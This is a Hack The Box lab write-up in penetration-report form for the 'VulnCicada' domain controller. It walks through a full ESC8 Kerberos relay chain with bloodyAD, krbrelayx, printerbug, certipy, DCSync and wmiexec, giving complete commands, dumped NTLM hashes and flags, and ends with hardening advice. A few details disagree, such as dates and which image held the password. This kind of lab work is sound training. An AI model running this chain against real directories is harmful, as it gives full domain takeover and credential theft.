---
title: "VulnCicada"
description: "A penetration test was conducted against the VulnCicada Active Directory environment. Starting with valid low-privileged domain credentials, full domain compromise was achieved…"
date: 2026-02-21
platform: "Hack The Box"
os: "Windows"
difficulty: "Medium"
tags: ["walkthrough", "htb", "adcs", "dcsync"]
---

**Target:** DC-JPQ225.cicada.vl  
**IP:** 10.129.234.48  
**Domain:** CICADA.VL  
**OS:** Windows Server 2022  
**Date:** 2026-05-01  
**Difficulty:** Medium  
**Platform:** Hackthebox

## Executive Summary
A penetration test was conducted against the VulnCicada Active Directory environment. Starting with valid low-privileged domain credentials, full domain compromise was achieved by exploiting a misconfigured Active Directory Certificate Services (ADCS) endpoint vulnerable to **ESC8 (NTLM/Kerberos relay to HTTP Web Enrollment)**.

The environment enforced **Kerberos-only authentication** (NTLM disabled), which required advanced relay techniques using `krbrelayx` and DNS record manipulation via `bloodyAD` to coerce the Domain Controller into authenticating over Kerberos to a rogue SMB server, ultimately obtaining a certificate for the DC machine account and performing a full **DCSync** attack.

**Result:** Full Domain Compromise  Administrator access obtained, all NTDS hashes dumped.

## Enumeration
### Nmap Scan


```bash
nmap -p- 10.129.234.48 -Pn -A -vv -T4

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-21 16:51:49Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-21T16:34:10
| Not valid after:  2027-02-21T16:34:10
| MD5:     2ec0 296b a79f b2d3 b2ea ac4e c7ae 2a17
| SHA-1:   d9ad 3ede 4ad8 afd4 e307 6b29 bcd4 1b58 0e09 dd30
| SHA-256: b7a3 2a35 5a7c 144a 09b7 789e 1b61 9667 e5f7 e2d0 4504 623a d152 6bc1 b4a6 6f03
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-21T16:34:10
| Not valid after:  2027-02-21T16:34:10
| MD5:     2ec0 296b a79f b2d3 b2ea ac4e c7ae 2a17
| SHA-1:   d9ad 3ede 4ad8 afd4 e307 6b29 bcd4 1b58 0e09 dd30
| SHA-256: b7a3 2a35 5a7c 144a 09b7 789e 1b61 9667 e5f7 e2d0 4504 623a d152 6bc1 b4a6 6f03
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-21T16:34:10
| Not valid after:  2027-02-21T16:34:10
| MD5:     2ec0 296b a79f b2d3 b2ea ac4e c7ae 2a17
| SHA-1:   d9ad 3ede 4ad8 afd4 e307 6b29 bcd4 1b58 0e09 dd30
| SHA-256: b7a3 2a35 5a7c 144a 09b7 789e 1b61 9667 e5f7 e2d0 4504 623a d152 6bc1 b4a6 6f03
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-21T16:34:10
| Not valid after:  2027-02-21T16:34:10
| MD5:     2ec0 296b a79f b2d3 b2ea ac4e c7ae 2a17
| SHA-1:   d9ad 3ede 4ad8 afd4 e307 6b29 bcd4 1b58 0e09 dd30
| SHA-256: b7a3 2a35 5a7c 144a 09b7 789e 1b61 9667 e5f7 e2d0 4504 623a d152 6bc1 b4a6 6f03
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-20T16:41:57
| Not valid after:  2026-08-22T16:41:57
| MD5:     b3de 1a60 5504 ce72 e546 328b 5c54 c5b3
| SHA-1:   1690 051f f41d 1eb7 d43c fec0 f806 b950 42a3 46e2
| SHA-256: db30 814e d972 b074 4c22 1456 bb62 6d5a 78c4 25f4 b562 ddae 5fce 436e 3136 fddf
|
|_ssl-date: 2026-02-21T16:53:23+00:00; +57s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55085/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55572/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55775/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
55776/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55794/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55815/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=2/21%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6999E2F3%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%TS=A)
SEQ(SP=109%GCD=4%ISR=107%TI=I%TS=A)
OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.009 days (since Sat Feb 21 16:40:39 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-21T16:52:46
|_  start_date: N/A
|_clock-skew: mean: 56s, deviation: 0s, median: 55s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18435/tcp): CLEAN (Timeout)
|   Check 2 (port 27404/tcp): CLEAN (Timeout)
|   Check 3 (port 21688/udp): CLEAN (Timeout)
|   Check 4 (port 18756/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   47.79 ms 10.10.16.1
2   76.93 ms 10.129.234.48

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.76 seconds
           Raw packets sent: 131206 (5.778MB) | Rcvd: 131 (7.318KB)

```

| Port     | Service    | Notes                                    |
| -------- | ---------- | ---------------------------------------- |
| 53       | DNS        | Simple DNS Plus                          |
| 80       | HTTP       | Microsoft IIS 10.0 — ADCS Web Enrollment |
| 88       | Kerberos   | KDC                                      |
| 389/636  | LDAP/LDAPS | Active Directory                         |
| 445      | SMB        | Signing required, NTLM disabled          |
| 3389     | RDP        | Terminal Services                        |
| 111/2049 | NFS        | Exposed profiles share                   |
	**Note:** SMB signing is enabled and NTLM is not 
	supported — all authentication must go through Kerberos.

### NFS Enumeration


```bash
smbclient -L //cicada.vl -N
session setup failed: NT_STATUS_NOT_SUPPORTED

```

### Mounting 

```bash
showmount -e cicada.vl
Export list for cicada.vl:
/profiles (everyone)

```

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada]
└─$ sudo mkdir -p /mnt/nfs

┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada]
└─$ sudo mount -t nfs cicada.vl:/profiles /mnt/nfs

```

**NFS Share Contents (`/profiles`):** NFS

```bash
(penguin㉿0X0F)-[/mnt/nfs]
└─$ ls -R  
.:
Administrator    Debra.Wright  Jordan.Francis  Katie.Ward     Richard.Gibbons  Shirley.West
Daniel.Marshall  Jane.Carter   Joyce.Andrews   Megan.Simpson  Rosie.Powell

./Administrator:
Documents  vacation.png
ls: cannot open directory './Administrator/Documents': Permission denied

./Daniel.Marshall:

./Debra.Wright:

./Jane.Carter:

./Jordan.Francis:

./Joyce.Andrews:

./Katie.Ward:

./Megan.Simpson:

./Richard.Gibbons:

./Rosie.Powell:
Documents  marketing.png
ls: cannot open directory './Rosie.Powell/Documents': Permission denied

./Shirley.West:
┌──(penguin㉿0X0F)-[/mnt/nfs]
└─$ 

```

 ![Image](../../assets/images/Pasted-image-20260221170646.png)


![Image](../../assets/images/Pasted-image-20260221173051.png)

- `Administrator/Documents` — Permission Denied
- `Rosie.Powell/` -  Contains `marketing.png`
- `Administrator/` - Contains `vacation.png`

> The NFS share leaks a full list of domain usernames, and the password `Cicada123` was obtained from the image (sticky note visible in the photo).


### SMB Share Enumeration

```bash
crackmapexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -d CICADA.VL -k --shares

SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:CICADA.VL) (signing:True) (SMBv1:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl [+] CICADA.VL\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl [+] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl CertEnroll      READ            Active Directory Certificate Services share                                                                            
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl NETLOGON        READ            Logon server share                                                                                                     
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225.cicada.vl SYSVOL          READ            Logon server share                                                                                                     
```

> The presence of `CertEnroll` immediately signals an ADCS deployment.

### Kerberos Setup

```bash
# /etc/krb5.conf
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    CICADA.VL = {
        kdc = DC-JPQ225.cicada.vl
        admin_server = DC-JPQ225.cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
```

```bash
echo 'Cicada123' | kinit Rosie.Powell@CICADA.VL
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### ADCS Enumeration - Certipy

```bash
certipy-ad find -u Rosie.Powell@cicada.vl -p Cicada123 -k -target DC-JPQ225.cicada.vl -stdout

Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 1A699EA6B93398854ACD114756F06613
    Certificate Validity Start          : 2026-05-01 20:57:59+00:00
    Certificate Validity End            : 2526-05-01 21:07:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

```

>**ESC8 Confirmed:** Web Enrollment is enabled over HTTP with no HTTPS enforcement, making it vulnerable to relay attacks.


## Privilege Escalation  ESC8 (ADCS Web Enrollment)

### Vulnerability Description

**ESC8** is an attack against Active Directory Certificate Services (ADCS) where the HTTP Web Enrollment endpoint does not enforce signing, making it vulnerable to relay attacks. An attacker can:

1. Coerce a privileged machine (e.g., Domain Controller) to authenticate to a rogue server
2. Relay that authentication to the ADCS HTTP endpoint
3. Request a certificate on behalf of the DC machine account
4. Use the certificate to obtain a TGT and NT hash for the DC, enabling DCSync

In this environment, NTLM was disabled, requiring a **Kerberos relay attack** using `krbrelayx` and the `CredMarshalTargetInfo`

**Step 1  Add Malicious DNS Record (bloodyAD)**

The `CredMarshalTargetInfo` technique requires a special DNS record. The DC resolves this hostname and generates a Kerberos ticket for `cifs/DC-JPQ225` (the real target) but connects to our attacker machine.

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
bloodyAD -u Rosie.Powell -p Cicada123 -d CICADA.VL --host DC-JPQ225.cicada.vl -k add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" 10.10.16.99

[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added

```

 **Step 2  Start krbrelayx** 
`Terminal 1`
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada/krbrelayx]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000
sudo python3 krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'

[sudo] password for penguin: 
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80

[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.48
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.234.48
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.234.48
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] GOT CERTIFICATE! ID 88
[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
[*] Certificate successfully written to file

```

**Step 3 Coerce DC Authentication via MS-RPRN 

`Terminal 2`
```bash
──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000
python3 krbrelayx/printerbug.py -k CICADA.VL/Rosie.Powell@DC-JPQ225.cicada.vl "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Attempting to trigger authentication via rprn RPC at DC-JPQ225.cicada.vl
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked

┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada]
└─$ 
```


**Step 4 Authenticate with Certificate**
```bash
export KRB5CCNAME=/tmp/krb5cc_1000
certipy-ad auth -pfx DC-JPQ225.pfx -dc-ip 10.129.234.48
```

**Step 5  DCSync (Dump NTDS)**
```bash
──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada/krbrelayx]
└─$ export KRB5CCNAME=dc-jpq225.ccache
netexec smb DC-JPQ225.cicada.vl -u 'DC-JPQ225$' --use-kcache --ntds

SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] CICADA.VL\DC-JPQ225$ from ccache 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::                                                          
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::                                                                 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::                                              
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::                                                 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::                                               
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::                                             
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::                                               
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::                                                  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::                                             
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::                                                            
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumped 14 NTDS hashes to /home/penguin/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-05-01_234845.ntds of which 13 were added to the database
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] To extract only enabled accounts from the output file, run the following command:
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] grep -iv disabled /home/penguin/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-05-01_234845.ntds | cut -d ':' -f1
```

## Post-Exploitation

### Shell Access as Administrator

Get TGT for Administrator using DC machine hash 

```bash
python3 /usr/share/doc/python3 impacket/examples/getTGT.py CICADA.VL/administrator -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87
```

Shell via wmiexec (Kerberos)

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/VulnCicada/krbrelayx]
└─$ export KRB5CCNAME=administrator.ccache
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass administrator@DC-JPQ225.cicada.vl

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C
C:\Users\Administrator\Desktop>type root.txt
7f606c1faa5972348079430aa393c981

C:\Users\Administrator\Desktop>type user.txt
f3d029217ed89b57f51f3c99436cb73a

C:\Users\Administrator\Desktop>

```


## Credentials Dumped

|Account|NT Hash|
|---|---|
|Administrator|`85a0da53871a9d56b6cd05deda3a5e87`|
|krbtgt|`8dd165a43fcb66d6a0e2924bb67e040c`|
|DC-JPQ225$|`a65952c664e9cf5de60195626edbeee3`|
|Shirley.West|`ff99630bed1e3bfd90e6a193d603113f`|
|Jordan.Francis|`f5caf661b715c4e1435dfae92c2a65e3`|
|Jane.Carter|`7e133f348892d577014787cbc0206aba`|
|Joyce.Andrews|`584c796cd820a48be7d8498bc56b4237`|
|Daniel.Marshall|`8cdf5eeb0d101559fa4bf00923cdef81`|
|Rosie.Powell|`ff99630bed1e3bfd90e6a193d603113f`|
|Megan.Simpson|`6e63f30a8852d044debf94d73877076a`|
|Katie.Ward|`42f8890ec1d9b9c76a187eada81adf1e`|
|Richard.Gibbons|`d278a9baf249d01b9437f0374bf2e32e`|
|Debra.Wright|`d9a2147edbface1666532c9b3acafaf`|

## Attack Chain Summary

```
[NFS Share] 
    └─> Password exposed in image (vacation.png)
        └─> Rosie.Powell:Cicada123

[SMB Enumeration - Kerberos]
    └─> CertEnroll share → ADCS detected
    └─> profiles$ READ/WRITE

[Certipy-AD]
    └─> ESC8: Web Enrollment over HTTP (no HTTPS)
    └─> CA Name: cicada-DC-JPQ225-CA

[BloodyAD - Kerberos]
    └─> Add DNS record with CredMarshalTargetInfo trick
        └─> DC-JPQ2251UWhRC...YBAAAA → 10.10.16.99

[krbrelayx]
    └─> Listening on port 445 (SMB) → relay to ADCS HTTP

[printerbug.py - MS-RPRN coercion]
    └─> DC authenticates to fake DNS name via Kerberos
    └─> AP_REQ relayed to ADCS HTTP endpoint
    └─> Certificate issued for DC-JPQ225$ → DC-JPQ225.pfx

[certipy-ad auth]
    └─> DC-JPQ225.pfx → TGT + NT hash for DC$

[netexec --ntds]
    └─> DCSync → all 14 NTDS hashes dumped
    └─> Administrator: 85a0da53871a9d56b6cd05deda3a5e87

[wmiexec - Kerberos]
    └─> Shell as Administrator
    └─> root.txt: 7f606c1faa5972348079430aa393c981
```

## Recommendations

### Critical

**1. Disable HTTP Web Enrollment / Enforce HTTPS (ESC8)**

- Enable HTTPS on the ADCS Web Enrollment endpoint
- Disable HTTP enrollment entirely if not required
- Enable EPA (Extended Protection for Authentication) on IIS
- Reference: [Microsoft ADCS Hardening](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview)

**2. Restrict NFS Export**

- Do not export sensitive profile shares to `everyone`
- Restrict `/profiles` NFS export to specific IP ranges or disable entirely
- Never store credentials or sensitive information in images accessible via network shares

### High

**3. Monitor DNS Record Creation**

- Alert on new DNS records containing the `CredMarshalTargetInfo` magic bytes (`1UWhRC`)
- This is a static indicator of the Kerberos relay attack vector

**4. Disable MS-RPRN (Print Spooler) on DCs**

- The Print Spooler service on Domain Controllers enables coercion via MS-RPRN
- Disable via: `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`

**5. Enable LDAP Signing and Channel Binding**

- Prevents LDAP relay attacks as a defence-in-depth measure

### Medium

**6. Rotate All Compromised Credentials**

- Reset passwords for all 13 domain accounts
- Rotate the `krbtgt` account password **twice** to invalidate all Kerberos tickets
- Reset the DC machine account password

**7. Audit ADCS Configuration Regularly**

- Use `certipy-ad find` or `Locksmith` periodically to detect ESC misconfigurations
- Review CA permissions and template ACLs

## References

- [Certified Pre-Owned — SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Relaying Kerberos over SMB using krbrelayx — Synacktiv](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html)
- [ESC8 Walkthrough — RBT Security](https://www.rbtsec.com/blog/active-directory-certificate-attack-esc8-adcs-web-enrollment/)
- [Using Kerberos for Authentication Relay — James Forshaw](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [krbrelayx — Dirk-jan Mollema](https://github.com/dirkjanm/krbrelayx)
